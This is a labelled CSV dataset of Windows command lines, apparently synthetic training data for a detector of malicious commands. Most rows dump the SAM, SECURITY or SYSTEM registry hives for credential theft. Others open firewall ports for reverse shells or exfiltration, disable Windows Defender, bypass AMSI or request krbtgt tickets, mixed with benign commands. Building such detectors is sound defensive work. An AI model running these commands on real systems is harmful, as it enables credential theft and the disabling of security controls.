text,label
reg save hklm\system c:\windows\temp\cd88o4s3.save,1
reg export hklm\security c:\windows\temp\ydv7hdbm.save,1
reg save hklm\security c:\windows\temp\e9vyhef6.save,1
reg save hklm\security c:\windows\temp\fkmwwp26.save,1
reg  export  hklm\system  c:\windows\temp\fg0kb3p6.save,1
reg save hklm\system c:\windows\temp\tlooao4c.save,1
reg export hklm\system c:\windows\temp\lql99we9.save,1
reg save hklm\security c:\windows\temp\mr2s92gp.save,1
reg export hklm\system c:\windows\temp\ykx3aufs.save,1
reg export hklm\sam c:\windows\temp\432q3aq6.save,1
rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444,2
reg export hklm\system c:\windows\temp\8ujf4yyq.save,1
reg export hklm\security c:\windows\temp\8dqrzym2.save,1
reg export hklm\sam c:\windows\temp\lhxpcinc.save,1
reg save hklm\system c:\windows\temp\rdo5ju1h.save,1
rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  1337,2
reg save hklm\security c:\windows\temp\2ktkjoyy.save,1
"powershell -nop -c ""rule: reverse shell | app: any | dir: outbound | act: allow | port: tcp 8888""",2
"powershell -nop -c ""reg  query  hkcu\console""",0
"powershell -nop -c ""rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
reg save hklm\sam c:\windows\temp\t1qil0qv.save,1
backup-utility  save  registry  config,0
reg save hklm\security c:\windows\temp\ay5jc0sl.save,1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\vv0o2nfo.save""",1
reg save hklm\security c:\windows\temp\5rbc9opm.save,1
reg export hklm\system c:\windows\temp\zk8loyeq.save,1
reg save hklm\system c:\windows\temp\st41le88.save,1
reg export hklm\security c:\windows\temp\7tbcp6s8.save,1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\cmulvm4r.save""",1
reg save hklm\system c:\windows\temp\viqbsgla.save,1
reg export hklm\system c:\windows\temp\nvc6mf9f.save,1
"cmd.exe /c ""rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
reg export hklm\sam c:\windows\temp\qqst28x1.save,1
reg export hklm\system c:\windows\temp\c19h7fpk.save,1
reg save hklm\system c:\windows\temp\nw0l0sor.save,1
reg export hklm\sam c:\windows\temp\8co0ue8u.save,1
reg save hklm\security c:\windows\temp\bps00b2w.save,1
reg  save  hklm\security  c:\windows\temp\hstwe94q.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\s.dat""",1
reg export hklm\sam c:\windows\temp\u3bdp6wq.save,1
reg save hklm\sam c:\windows\temp\pfqi1n7l.save,1
reg save hklm\security c:\windows\temp\uxb0qizo.save,1
reg export hklm\security c:\windows\temp\un926ic7.save,1
reg export hklm\security c:\windows\temp\t9wp2ari.save,1
reg save hklm\sam c:\windows\temp\6db0arkw.save,1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\a37k52z4.save""",1
reg save hklm\system c:\windows\temp\puyddclt.save,1
reg save hklm\sam c:\windows\temp\g3hevb9y.save,1
reg export hklm\sam c:\windows\temp\uc4fon46.save,1
reg save hklm\sam c:\windows\temp\1n7nnxf3.save,1
"powershell -nop -c ""reg export hklm\sam c:\windows\temp\bp05x3zc.save""",1
reg export hklm\system c:\windows\temp\bqub4ku5.save,1
reg save hklm\security c:\windows\temp\7cgur4ax.save,1
reg export hklm\system c:\windows\temp\sue3mtpr.save,1
reg export hklm\security c:\windows\temp\fa6xi7yi.save,1
reg save hklm\sam c:\windows\temp\jhu882bv.save,1
"powershell -nop -c ""powershell -nop -c ""reg save hklm\sam c:\temp\s.dat""""",1
reg export hklm\system c:\windows\temp\07so9enc.save,1
reg save hklm\system c:\windows\temp\npluav2q.save,1
reg save hklm\system c:\windows\temp\6pdv349f.save,1
reg export hklm\system c:\windows\temp\hsgitj1e.save,1
reg export hklm\system c:\windows\temp\hxkrbwlp.save,1
reg save hklm\security c:\windows\temp\doo3exee.save,1
"cmd.exe /c ""rule:  reverse  shell  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg save hklm\system c:\windows\temp\fi9nu6s7.save,1
reg export hklm\security c:\windows\temp\cozqgyos.save,1
reg save hklm\sam c:\windows\temp\dm4sf520.save,1
reg save hklm\system c:\windows\temp\bwr91qtm.save,1
reg export hklm\system c:\windows\temp\agw9ge0f.save,1
reg save hklm\system c:\windows\temp\p8d3uz5r.save,1
reg export hklm\system c:\windows\temp\cm6mfmfy.save,1
reg export hklm\security c:\windows\temp\wdjkp80e.save,1
reg save hklm\security c:\windows\temp\zpux51be.save,1
reg export hklm\system c:\windows\temp\68r4tes7.save,1
reg save hklm\sam c:\windows\temp\0obbglfv.save,1
reg export hklm\sam c:\windows\temp\02l8u10u.save,1
reg export hklm\security c:\windows\temp\q89szorr.save,1
rule:  reverse  shell  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  1337,2
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\farx4ik0.save""",1
reg export hklm\sam c:\windows\temp\pb7dr4v2.save,1
"cmd.exe /c ""[dllimport(""advapi32.dll"")]  extern  bool  duplicatetokenex(...)""",3
reg save hklm\system c:\windows\temp\sy0ao7by.save,1
reg save hklm\system c:\windows\temp\lqntpo2y.save,1
reg save hklm\security c:\windows\temp\ldkh4zrk.save,1
reg save hklm\system c:\windows\temp\hmomtnzm.save,1
reg export hklm\system c:\windows\temp\skq7pans.save,1
reg  export  hklm\sam  c:\windows\temp\jowcz3d7.save,1
reg save hklm\system c:\windows\temp\wf44i741.save,1
reg save hklm\sam c:\windows\temp\mh7kw6lk.save,1
reg export hklm\security c:\windows\temp\wn534hf9.save,1
"cmd.exe /c ""rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444""",2
reg save hklm\security c:\windows\temp\rsupseck.save,1
reg save hklm\sam c:\windows\temp\me9c3s9y.save,1
reg save hklm\security c:\windows\temp\kk7kd7vg.save,1
reg export hklm\sam c:\windows\temp\331vatee.save,1
reg save hklm\sam c:\windows\temp\lu0w0b1i.save,1
reg export hklm\security c:\windows\temp\87wh1p68.save,1
reg export hklm\sam c:\windows\temp\v1j12hfk.save,1
reg export hklm\sam c:\windows\temp\kkq3kg40.save,1
reg export hklm\security c:\windows\temp\06w2tb54.save,1
reg save hklm\sam c:\windows\temp\t3u5afcc.save,1
reg export hklm\sam c:\windows\temp\6l376a9f.save,1
reg export hklm\system c:\windows\temp\urzaa4oe.save,1
reg save hklm\security c:\windows\temp\demqbpth.save,1
reg save hklm\security c:\windows\temp\nx2o4pxh.save,1
reg save hklm\sam c:\windows\temp\e4wqlhth.save,1
reg export hklm\security c:\windows\temp\vtzl80bc.save,1
reg save hklm\security c:\windows\temp\c1shv4rl.save,1
reg export hklm\system c:\windows\temp\h3yqstj1.save,1
reg save hklm\sam c:\windows\temp\pt4xf7e2.save,1
reg export hklm\security c:\windows\temp\rjkq07rl.save,1
reg export hklm\sam c:\windows\temp\y9k5mbmj.save,1
reg save hklm\security c:\windows\temp\o7vo5i05.save,1
reg save hklm\system c:\windows\temp\rr1fjgmm.save,1
reg save hklm\security c:\windows\temp\gqd7w1k2.save,1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\bpwcc5ny.save""",1
reg export hklm\sam c:\windows\temp\vneeh24x.save,1
reg export hklm\sam c:\windows\temp\j38nfu4k.save,1
reg export hklm\security c:\windows\temp\3mzdcj7x.save,1
reg save hklm\security c:\windows\temp\jg2qt5lq.save,1
reg save hklm\system c:\windows\temp\rt520fx3.save,1
reg export hklm\sam c:\windows\temp\zc31bda0.save,1
reg save hklm\system c:\windows\temp\8m40v4ep.save,1
reg save hklm\sam c:\windows\temp\834p2q2a.save,1
reg export hklm\security c:\windows\temp\pzoenx7n.save,1
reg export hklm\sam c:\windows\temp\wx1qbs1n.save,1
reg export hklm\system c:\windows\temp\fhhy44fn.save,1
reg save hklm\security c:\windows\temp\uhdkjq39.save,1
reg export hklm\security c:\windows\temp\9nng79im.save,1
reg export hklm\security c:\windows\temp\amtlt9zk.save,1
reg save hklm\system c:\windows\temp\t5a8mivf.save,1
"powershell -nop -c ""reg   export   hklm\security   c:\windows\temp\c8pvmq9t.save""",1
reg export hklm\system c:\windows\temp\m1dulv8n.save,1
reg export hklm\system c:\windows\temp\yfzl86xp.save,1
reg export hklm\system c:\windows\temp\jri03rx2.save,1
reg export hklm\system c:\windows\temp\7gcds27i.save,1
"powershell -nop -c ""rule:   c2   beacon   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
reg save hklm\security c:\windows\temp\1yohl194.save,1
reg export hklm\sam c:\windows\temp\ng7sjyva.save,1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\f74vf0nv.save""",1
reg export hklm\system c:\windows\temp\qc73axrm.save,1
reg save hklm\security c:\windows\temp\w6qbgqdm.save,1
reg save hklm\sam c:\windows\temp\x3cingxf.save,1
reg save hklm\sam c:\windows\temp\2lc2j09q.save,1
reg export hklm\system c:\windows\temp\y6tzkhjh.save,1
klist  get  krbtgt/domain.local,3
reg save hklm\system c:\windows\temp\e6ye7gco.save,1
"cmd.exe /c ""get-registry-value -path hklm\sam\domains""",0
reg save hklm\security c:\windows\temp\54wmc4yo.save,1
reg export hklm\sam c:\windows\temp\np7qzxns.save,1
reg save hklm\security c:\windows\temp\srjfnnyg.save,1
reg save hklm\sam c:\windows\temp\tzl88dsw.save,1
reg export hklm\security c:\windows\temp\zzvq66d1.save,1
reg export hklm\sam c:\windows\temp\x1fv2i5p.save,1
reg export hklm\security c:\windows\temp\s5n7o719.save,1
rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  1337,2
reg save hklm\security c:\windows\temp\ozmkbkng.save,1
reg save hklm\system c:\windows\temp\pj78ud10.save,1
reg export hklm\sam c:\windows\temp\g0suueo5.save,1
reg save hklm\security c:\windows\temp\z11rngjb.save,1
reg   export   hklm\system   c:\windows\temp\xaqjcyy1.save,1
reg export hklm\sam c:\windows\temp\mxsbu3xu.save,1
reg save hklm\security c:\windows\temp\kbm4ge30.save,1
reg save hklm\system c:\windows\temp\5g1w49h0.save,1
"cmd.exe /c ""backup-utility   save   registry   config""",0
reg save hklm\system c:\windows\temp\xlalsbpm.save,1
reg  export  hklm\system  c:\windows\temp\o3wbpj1i.save,1
reg export hklm\security c:\windows\temp\209i9r66.save,1
reg export hklm\security c:\windows\temp\jtrgvbxl.save,1
reg save hklm\system c:\windows\temp\akg08qzb.save,1
reg export hklm\sam c:\windows\temp\olqr1zsy.save,1
reg save hklm\sam c:\windows\temp\vljcr7vo.save,1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\nfk2ixrz.save""",1
reg save hklm\sam c:\windows\temp\8fdoxl27.save,1
reg export hklm\system c:\windows\temp\75iguuzj.save,1
reg  export  hklm\sam  c:\windows\temp\zze9g99k.save,1
reg export hklm\sam c:\windows\temp\e2glpllp.save,1
reg export hklm\security c:\windows\temp\m4getfy7.save,1
reg save hklm\security c:\windows\temp\1xpgfrk8.save,1
reg export hklm\security c:\windows\temp\m2n2ocxg.save,1
reg export hklm\security c:\windows\temp\i4p5hafq.save,1
reg save hklm\system c:\windows\temp\dwt8ruc0.save,1
"powershell -nop -c ""[dllimport(""advapi32.dll"")] extern bool duplicatetokenex(...)""",3
$a = [ref].assembly.gettype('system.management.automation.amsiutils'),3
reg export hklm\security c:\windows\temp\tm14hwmg.save,1
reg export hklm\security c:\windows\temp\oxohl3hx.save,1
reg save hklm\security c:\windows\temp\vsolzj7j.save,1
reg save hklm\system c:\windows\temp\xemksdbf.save,1
reg export hklm\system c:\windows\temp\8i90djrp.save,1
reg export hklm\security c:\windows\temp\s982gca2.save,1
reg save hklm\system c:\windows\temp\xu45pamw.save,1
reg save hklm\security c:\windows\temp\rvk77q9l.save,1
reg export hklm\sam c:\windows\temp\l3je0naf.save,1
reg save hklm\sam c:\windows\temp\vtdnjkbf.save,1
reg export hklm\sam c:\windows\temp\orxot2sq.save,1
reg export hklm\sam c:\windows\temp\0c8xisfy.save,1
reg export hklm\security c:\windows\temp\aptw29tm.save,1
reg save hklm\sam c:\windows\temp\n0r6b30w.save,1
powershell   get-process,0
reg save hklm\security c:\windows\temp\bzgprlq6.save,1
reg save hklm\system c:\windows\temp\291d2b17.save,1
reg save hklm\sam c:\windows\temp\fop13w7g.save,1
"cmd.exe /c ""netsh advfirewall firewall add rule name=""bad"" action=allow protocol=any port=4444""",2
reg export hklm\sam c:\windows\temp\79a7n8ae.save,1
reg   query   hkcu\console,0
reg export hklm\system c:\windows\temp\zhc5gqog.save,1
"cmd.exe /c ""rule: reverse shell | app: any | dir: outbound | act: allow | port: tcp 8888""",2
reg save hklm\sam c:\windows\temp\mrcu2twb.save,1
reg save hklm\system c:\windows\temp\mtziuo7j.save,1
reg save hklm\sam c:\windows\temp\zvhyhnls.save,1
rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: tcp 8888,2
reg export hklm\security c:\windows\temp\wxn7758m.save,1
reg export hklm\security c:\windows\temp\xeow80j5.save,1
reg export hklm\sam c:\windows\temp\hr5uzkd4.save,1
reg save hklm\sam c:\windows\temp\4ntu509f.save,1
"cmd.exe /c ""c:\windows\system32\svchost.exe -k networkservice""",0
"cmd.exe /c ""reg  export  hklm\sam  c:\windows\temp\mpn4k67w.save""",1
reg save hklm\security c:\windows\temp\bn4gt0mu.save,1
"cmd.exe /c ""netsh   dump   >   netconfig.txt""",0
reg export hklm\system c:\windows\temp\y1pyioww.save,1
"powershell -nop -c ""rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg export hklm\system c:\windows\temp\3z670a9h.save,1
reg save hklm\system c:\windows\temp\7zg7octq.save,1
reg export hklm\system c:\windows\temp\aiids5ua.save,1
reg export hklm\system c:\windows\temp\hl66j2qa.save,1
reg save hklm\security c:\windows\temp\0jfwhss8.save,1
reg export hklm\sam c:\windows\temp\wyybpunh.save,1
reg save hklm\system c:\windows\temp\2dtlzr90.save,1
reg save hklm\sam c:\windows\temp\hk038mg3.save,1
reg export hklm\system c:\windows\temp\5pko2ay3.save,1
"powershell -nop -c ""wmic product get name, version""",0
reg save hklm\sam c:\windows\temp\is91707s.save,1
reg export hklm\system c:\windows\temp\3w4h1scg.save,1
reg save hklm\system c:\windows\temp\szy7is3a.save,1
reg export hklm\system c:\windows\temp\7pt7vny7.save,1
reg save hklm\sam c:\windows\temp\46o8mxds.save,1
reg export hklm\security c:\windows\temp\wqllxmll.save,1
reg save hklm\sam c:\windows\temp\hhjeg942.save,1
reg export hklm\system c:\windows\temp\5wwaxa8a.save,1
reg export hklm\system c:\windows\temp\4mjcaywc.save,1
reg save hklm\system c:\windows\temp\dt78nkcd.save,1
reg export hklm\security c:\windows\temp\dwq5wtqw.save,1
"cmd.exe /c ""reg   save   hklm\sam   c:\windows\temp\ztb5gb7p.save""",1
reg export hklm\security c:\windows\temp\f251ltz7.save,1
reg export hklm\sam c:\windows\temp\szrccc4e.save,1
"powershell -nop -c ""sc stop windefend""",2
reg save hklm\sam c:\windows\temp\rtx2p31j.save,1
reg export hklm\system c:\windows\temp\dsf9wmd2.save,1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\nlhdzctz.save""",1
reg export hklm\security c:\windows\temp\7790key0.save,1
reg export hklm\security c:\windows\temp\7oq2yvyz.save,1
reg save hklm\sam c:\windows\temp\9xaxkt8u.save,1
"cmd.exe /c ""runas  /user:administrator  cmd.exe""",3
reg save hklm\sam c:\windows\temp\el39gm7g.save,1
reg save hklm\sam c:\windows\temp\ubsaa51c.save,1
reg export hklm\system c:\windows\temp\jf1b9m7j.save,1
reg export hklm\sam c:\windows\temp\h5i1mrlt.save,1
reg export hklm\security c:\windows\temp\6xm3jrvx.save,1
klist   get   krbtgt/domain.local,3
reg export hklm\sam c:\windows\temp\lyko4ec8.save,1
reg export hklm\system c:\windows\temp\uq4agsm6.save,1
reg export hklm\system c:\windows\temp\84e07x7n.save,1
reg save hklm\security c:\windows\temp\r3rbgjka.save,1
reg save hklm\sam c:\windows\temp\eakz6u7p.save,1
reg export hklm\system c:\windows\temp\4kwj76fs.save,1
reg save hklm\security c:\windows\temp\bwbjvmjb.save,1
reg save hklm\security c:\windows\temp\2gycguq5.save,1
reg export hklm\sam c:\windows\temp\qm8gamyy.save,1
"powershell -nop -c ""rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444""",2
reg export hklm\system c:\windows\temp\t1fs27d8.save,1
reg export hklm\system c:\windows\temp\5po1zmhj.save,1
reg save hklm\sam c:\windows\temp\olgih9yz.save,1
reg export hklm\system c:\windows\temp\7vkte9qj.save,1
reg export hklm\security c:\windows\temp\3m5nj4pg.save,1
reg save hklm\security c:\windows\temp\ing7v9rz.save,1
reg export hklm\system c:\windows\temp\g6sqaqpf.save,1
"powershell -nop -c ""set-mppreference  -disablerealtimemonitoring  $true""",2
reg save hklm\security c:\windows\temp\bxznpu66.save,1
reg export hklm\sam c:\windows\temp\1xk7g4en.save,1
reg save hklm\system c:\windows\temp\loap1ufk.save,1
reg save hklm\system c:\windows\temp\izq9sui2.save,1
reg save hklm\sam c:\windows\temp\md4pgiod.save,1
reg export hklm\system c:\windows\temp\k6oc34he.save,1
reg save hklm\security c:\windows\temp\mwjg1o45.save,1
reg save hklm\security c:\windows\temp\6fg6hknw.save,1
reg export hklm\sam c:\windows\temp\xlccjt9f.save,1
reg export hklm\system c:\windows\temp\4m0m4j5a.save,1
reg save hklm\system c:\windows\temp\i4n5k4jd.save,1
reg save hklm\security c:\windows\temp\u860dtng.save,1
reg export hklm\sam c:\windows\temp\81pr5rzr.save,1
reg export hklm\security c:\windows\temp\4sm23r6h.save,1
reg save hklm\sam c:\windows\temp\zkmlt23v.save,1
reg save hklm\system c:\windows\temp\vnvvkg1c.save,1
reg export hklm\system c:\windows\temp\1vldx1k6.save,1
reg save hklm\sam c:\windows\temp\q7wm0ymn.save,1
reg export hklm\system c:\windows\temp\tbnvkfxw.save,1
reg save hklm\system c:\windows\temp\vpdiztq8.save,1
reg export hklm\security c:\windows\temp\o8qti6fz.save,1
"cmd.exe /c ""rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"powershell -nop -c ""rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg export hklm\system c:\windows\temp\8smttib9.save,1
reg export hklm\security c:\windows\temp\gbm8zadb.save,1
node  server.js  --port  3000,0
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\jqy28xym.save""",1
"powershell -nop -c ""$a  =  [ref].assembly.gettype('system.management.automation.impersonateloggedonuser')""",3
reg save hklm\system c:\windows\temp\j934493e.save,1
reg export hklm\security c:\windows\temp\jru476nx.save,1
reg save hklm\sam c:\windows\temp\sskejfpe.save,1
reg save hklm\sam c:\windows\temp\08vwz7au.save,1
reg export hklm\sam c:\windows\temp\5hg9zpvj.save,1
reg save hklm\system c:\windows\temp\bhm4swcv.save,1
reg save hklm\security c:\windows\temp\vayzffdf.save,1
reg save hklm\system c:\windows\temp\63qv55yp.save,1
reg save hklm\sam c:\windows\temp\smjw1egh.save,1
reg export hklm\sam c:\windows\temp\1ovkvbgv.save,1
"powershell -nop -c ""rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444""",2
reg export hklm\security c:\windows\temp\raaqcemv.save,1
reg export hklm\sam c:\windows\temp\qny7530p.save,1
reg export hklm\security c:\windows\temp\vvl09a77.save,1
reg save hklm\security c:\windows\temp\83hm89m1.save,1
reg export hklm\sam c:\windows\temp\lzk8txpd.save,1
reg save hklm\sam c:\windows\temp\gu44jts7.save,1
reg export hklm\sam c:\windows\temp\ibu0zh4x.save,1
reg save hklm\system c:\windows\temp\319fjzm3.save,1
"powershell -nop -c ""reg save hklm\sam c:\windows\temp\yg3dqqz1.save""",1
reg export hklm\security c:\windows\temp\a2fax460.save,1
reg save hklm\system c:\windows\temp\nc9ha4dr.save,1
"cmd.exe /c ""netsh   advfirewall   firewall   add   rule   name=""bad""   action=allow   protocol=any   port=4444""",2
reg save hklm\system c:\windows\temp\i4tza1km.save,1
reg save hklm\system c:\windows\temp\hrybmo6o.save,1
reg export hklm\sam c:\windows\temp\pji5wea6.save,1
reg export hklm\security c:\windows\temp\imminrca.save,1
reg export hklm\security c:\windows\temp\mwceuh87.save,1
reg save hklm\security c:\windows\temp\v862tska.save,1
reg export hklm\system c:\windows\temp\17qjj3kx.save,1
reg   save   hklm\system   c:\windows\temp\yxoc32oc.save,1
reg export hklm\system c:\windows\temp\8toa0028.save,1
reg export hklm\sam c:\windows\temp\m0stlwqy.save,1
reg  export  hklm\system  c:\windows\temp\inwm2ek9.save,1
reg save hklm\security c:\windows\temp\maq486it.save,1
reg save hklm\sam c:\windows\temp\301dkvze.save,1
"powershell -nop -c ""rule:   c2   beacon   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
reg export hklm\security c:\windows\temp\3va6gwdb.save,1
reg export hklm\system c:\windows\temp\6a5ec8va.save,1
"cmd.exe /c ""rule: c2 beacon | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444""",2
reg export hklm\security c:\windows\temp\1ozudj12.save,1
reg export hklm\security c:\windows\temp\lc4z7juq.save,1
"cmd.exe /c ""rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337""",2
reg save hklm\sam c:\windows\temp\t24r00f5.save,1
reg export hklm\system c:\windows\temp\uq9v486b.save,1
reg export hklm\system c:\windows\temp\tg6roipa.save,1
reg save hklm\security c:\windows\temp\nr4wauj1.save,1
reg save hklm\sam c:\windows\temp\d0pxkoi1.save,1
"cmd.exe /c ""$a   =   [ref].assembly.gettype('system.management.automation.amsiutils')""",3
reg save hklm\security c:\windows\temp\i9iogidu.save,1
reg save hklm\security c:\windows\temp\5vwvwxec.save,1
reg save hklm\security c:\windows\temp\skrcvk0t.save,1
reg export hklm\system c:\windows\temp\lcloohs8.save,1
reg save hklm\security c:\windows\temp\obb340gq.save,1
reg export hklm\sam c:\windows\temp\5ir7r114.save,1
reg export hklm\system c:\windows\temp\k1myejfw.save,1
reg   export   hklm\security   c:\windows\temp\s4ez40df.save,1
"cmd.exe /c ""rule: reverse shell | app: any | dir: outbound | act: allow | port: 4444""",2
reg export hklm\system c:\windows\temp\nzmatct0.save,1
reg save hklm\security c:\windows\temp\y7z0twk3.save,1
reg export hklm\sam c:\windows\temp\id66bjpg.save,1
reg save hklm\security c:\windows\temp\ih4phkto.save,1
reg export hklm\system c:\windows\temp\rk74dxxk.save,1
reg export hklm\sam c:\windows\temp\gkyg52kf.save,1
reg save hklm\system c:\windows\temp\wyemlh93.save,1
"cmd.exe /c ""get-registry-value   -path   hklm\sam\domains""",0
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\46gg9dgi.save""",1
reg export hklm\sam c:\windows\temp\aoymggip.save,1
reg   save   hklm\system   c:\windows\temp\1n8d1bce.save,1
reg export hklm\system c:\windows\temp\ar3z20wu.save,1
"powershell -nop -c ""rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337""",2
reg save hklm\system c:\windows\temp\udc98mi0.save,1
reg save hklm\sam c:\windows\temp\lgbt104z.save,1
reg export hklm\system c:\windows\temp\9afmm5f3.save,1
reg  save  hklm\sam  c:\windows\temp\sr9e5zob.save,1
reg save hklm\security c:\windows\temp\uttmonrf.save,1
reg save hklm\sam c:\windows\temp\25wafqki.save,1
reg save hklm\system c:\windows\temp\k4riaevn.save,1
reg export hklm\sam c:\windows\temp\sv494vec.save,1
reg save hklm\system c:\windows\temp\wphvffe2.save,1
reg save hklm\security c:\windows\temp\kf5oldl5.save,1
reg export hklm\security c:\windows\temp\kv861iyp.save,1
reg save hklm\sam c:\windows\temp\n7r50z44.save,1
reg export hklm\security c:\windows\temp\oyu0k30g.save,1
reg save hklm\system c:\windows\temp\rhl66wwn.save,1
get-registry-value   -path   hklm\sam\domains,0
reg save hklm\system c:\windows\temp\nuq7si74.save,1
reg export hklm\system c:\windows\temp\c39672a1.save,1
"powershell -nop -c ""reg save hklm\security c:\windows\temp\lwclwvcl.save""",1
reg  save  hklm\system  c:\windows\temp\9lgqsmq0.save,1
reg export hklm\system c:\windows\temp\3ddt3gel.save,1
reg save hklm\sam c:\windows\temp\cih8ftzn.save,1
reg save hklm\system c:\windows\temp\0qb5xhs6.save,1
reg export hklm\security c:\windows\temp\5ogmhq0r.save,1
reg save hklm\sam c:\windows\temp\6y2tzxlq.save,1
reg save hklm\system c:\windows\temp\410kbi74.save,1
reg save hklm\sam c:\windows\temp\a9048pa9.save,1
reg save hklm\system c:\windows\temp\cfg2krpr.save,1
"powershell -nop -c ""rule: exfil data | app: any | dir: outbound | act: allow | port: 4444""",2
reg save hklm\sam c:\windows\temp\hdi9dy8m.save,1
"powershell -nop -c ""reg export hklm\security c:\windows\temp\4yi2rzxm.save""",1
rule:   exfil   data   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
reg export hklm\system c:\windows\temp\ae469xja.save,1
"cmd.exe /c ""rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
reg export hklm\sam c:\windows\temp\45n4uu78.save,1
reg export hklm\sam c:\windows\temp\2qlmr2q0.save,1
reg export hklm\sam c:\windows\temp\b4noddgn.save,1
"powershell -nop -c ""reg  save  hklm\sam  c:\windows\temp\20m56uqw.save""",1
reg export hklm\system c:\windows\temp\sdmnc09o.save,1
reg export hklm\security c:\windows\temp\4m0evoox.save,1
reg export hklm\system c:\windows\temp\71kabif2.save,1
"powershell -nop -c ""rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
reg save hklm\sam c:\windows\temp\pef8o2og.save,1
reg save hklm\sam c:\windows\temp\32yf5ey7.save,1
reg save hklm\security c:\windows\temp\1lat46uy.save,1
reg save hklm\system c:\windows\temp\97optwpc.save,1
reg export hklm\security c:\windows\temp\9yc48ts1.save,1
reg export hklm\system c:\windows\temp\qx4p47wv.save,1
"powershell -nop -c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
reg save hklm\security c:\windows\temp\msz73of6.save,1
reg save hklm\sam c:\windows\temp\l4yxwi2i.save,1
reg export hklm\system c:\windows\temp\xsvfdhdi.save,1
reg save hklm\system c:\windows\temp\tors18fb.save,1
reg export hklm\system c:\windows\temp\gwbe96uq.save,1
reg export hklm\sam c:\windows\temp\0emh7ldn.save,1
reg save hklm\security c:\windows\temp\bjevpfd4.save,1
reg export hklm\system c:\windows\temp\2t7bd0mb.save,1
reg export hklm\system c:\windows\temp\mp2qcwje.save,1
rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337,2
reg export hklm\security c:\windows\temp\2jvxu1az.save,1
reg   export   hklm\sam   c:\windows\temp\tz7xn8tf.save,1
"powershell -nop -c ""klist   purge""",3
reg save hklm\sam c:\windows\temp\x97zxhpf.save,1
"powershell -nop -c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
reg export hklm\sam c:\windows\temp\alq6yo0j.save,1
reg export hklm\security c:\windows\temp\hn3freut.save,1
reg save hklm\security c:\windows\temp\n2lk976j.save,1
